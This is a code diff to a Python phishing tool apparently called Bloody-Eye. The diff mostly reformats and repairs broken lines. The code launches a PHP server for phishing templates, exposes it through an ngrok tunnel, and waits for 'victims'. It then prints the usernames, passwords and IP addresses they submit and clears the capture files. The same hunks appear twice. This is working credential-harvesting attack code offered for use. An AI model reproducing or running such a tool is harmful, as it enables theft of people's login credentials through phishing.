@@ -526,9 +526,9 @@ exit();""")
     print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Choose a Service to Port Forwarding")
     print("")
     time.sleep(0.07)
-    print(Fore.RED+" ["+Fore.WHITE+"O1"+Fore.RED+"]"+Fore.YELLOW+" Localhost")           
-    print("")                                                                 
-    print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+Fore.YELLOW+" Ngorok.io")                                                                                                                                             
+    print(Fore.RED+" ["+Fore.WHITE+"O1"+Fore.RED+"]"+Fore.YELLOW+" Localhost")
+    print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+Fore.YELLOW+" Ngorok.io")
+    print("")
     def phpserver():
        with open("log","w") as phplog:
           Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
@@ -536,7 +536,6 @@ exit();""")
        print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.GREEN+" Hosted at : "+Fore.BLUE+"localhost:6060")
        time.sleep(0.07)
        print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.YELLOW+" Waiting for victim,"+Fore.BLUE+" Ctrl + C"+Fore.YELLOW+" to exit...")
-
     def ngrokserver():
        try:
           bannner.banner2()
@@ -544,8 +543,8 @@ exit();""")
              Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
           global token
           a = ngrok.connect(6060,"http",auth_token=token)
-          print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 1 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replac$
-          print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 2 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replac$
+          print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 1 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("http","https").replace("-> https://localhost:6060",""))
+          print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 2 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> http://localhost:6060",""))
           time.sleep(0.07)
           print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.YELLOW+" Waiting for Victim,"+Fore.BLUE+" Ctrl + C"+Fore.YELLOW+" to exit...")
        except:
@@ -568,23 +567,27 @@ exit();""")
             try:
                 infor = json.loads(b)
                 for value in infor['dev']:
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+" Username : "+Fore.WHITE+value['username'])                                                       print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+" Password : "+Fore.WHITE+value["password"])                                                       a = open("../Bloody-Eye/templates/phishing/usernames.json","w")
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+" Username : "+Fore.WHITE+value['username'])
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+" Password : "+Fore.WHITE+value["password"])
+                    a = open("../Bloody-Eye/templates/phishing/usernames.json","w")
                     b = a.write("")
                     a.close()
             except:
                 None
 # Getting Victim Info
-    def info():                                                                                                                                                     global stat_file
-            if not str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size) == stat_file:                                                                     stat_file = str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size)
+    def info():
+            global stat_file
+            if not str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size) == stat_file:
+                stat_file = str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size)
                 fileip = open("../Bloody-Eye/templates/phishing/info.json","r")
                 b = fileip.read()
             try:
                 infor = json.loads(b)
-                for value in infor['dev']:                                                                                                             $
+                for value in infor['dev']:
 
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.GREEN+" Victim IP Found")                                                $
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.GREEN+" Victim IP Found")
                     print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Victim's IP : "+Fore.WHITE+value['Ip'])
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Saved in :"+Fore.YELLOW+" /templates/phishing/"+Fore.RED+"info.jso$
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Saved in :"+Fore.YELLOW+" /templates/phishing/"+Fore.RED+"info.json")
                     a = open("../Bloody-Eye/templates/phishing/info.json","w")
                     b = a.write("")
 
@@ -954,9 +957,9 @@ exit();
     print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Choose a Service to Port Forwarding")
     print("")
     time.sleep(0.07)
-    print(Fore.RED+" ["+Fore.WHITE+"O1"+Fore.RED+"]"+Fore.YELLOW+" Localhost")           
-    print("")                                                                 
-    print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+Fore.YELLOW+" Ngorok.io")                                                                                                                                             
+    print(Fore.RED+" ["+Fore.WHITE+"O1"+Fore.RED+"]"+Fore.YELLOW+" Localhost")
+    print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+Fore.YELLOW+" Ngorok.io")
+    print("")
     def phpserver():
        with open("log","w") as phplog:
           Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
@@ -964,7 +967,6 @@ exit();
        print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.GREEN+" Hosted at : "+Fore.BLUE+"localhost:6060")
        time.sleep(0.07)
        print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.YELLOW+" Waiting for victim,"+Fore.BLUE+" Ctrl + C"+Fore.YELLOW+" to exit...")
-
     def ngrokserver():
        try:
           bannner.banner2()
@@ -972,8 +974,8 @@ exit();
              Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
           global token
           a = ngrok.connect(6060,"http",auth_token=token)
-          print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 1 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replac$
-          print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 2 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replac$
+          print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 1 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("http","https").replace("-> https://localhost:6060",""))
+          print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 2 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> http://localhost:6060",""))
           time.sleep(0.07)
           print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.YELLOW+" Waiting for Victim,"+Fore.BLUE+" Ctrl + C"+Fore.YELLOW+" to exit...")
        except:
@@ -996,23 +998,27 @@ exit();
             try:
                 infor = json.loads(b)
                 for value in infor['dev']:
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+" Username : "+Fore.WHITE+value['username'])                                                       print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+" Password : "+Fore.WHITE+value["password"])                                                       a = open("../Bloody-Eye/templates/phishing/usernames.json","w")
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+" Username : "+Fore.WHITE+value['username'])
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+" Password : "+Fore.WHITE+value["password"])
+                    a = open("../Bloody-Eye/templates/phishing/usernames.json","w")
                     b = a.write("")
                     a.close()
             except:
                 None
 # Getting Victim Info
-    def info():                                                                                                                                                     global stat_file
-            if not str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size) == stat_file:                                                                     stat_file = str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size)
+    def info():
+            global stat_file
+            if not str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size) == stat_file:
+                stat_file = str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size)
                 fileip = open("../Bloody-Eye/templates/phishing/info.json","r")
                 b = fileip.read()
             try:
                 infor = json.loads(b)
-                for value in infor['dev']:                                                                                                             $
+                for value in infor['dev']:
 
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.GREEN+" Victim IP Found")                                                $
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.GREEN+" Victim IP Found")
                     print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Victim's IP : "+Fore.WHITE+value['Ip'])
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Saved in :"+Fore.YELLOW+" /templates/phishing/"+Fore.RED+"info.jso$
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Saved in :"+Fore.YELLOW+" /templates/phishing/"+Fore.RED+"info.json")
                     a = open("../Bloody-Eye/templates/phishing/info.json","w")
                     b = a.write("")
 
@@ -1027,7 +1033,6 @@ exit();
         Popen(("killall","-KILL","php"),stdout=kill,stderr=kill)
         print(" ")
         sys.exit()
-
 
 
 
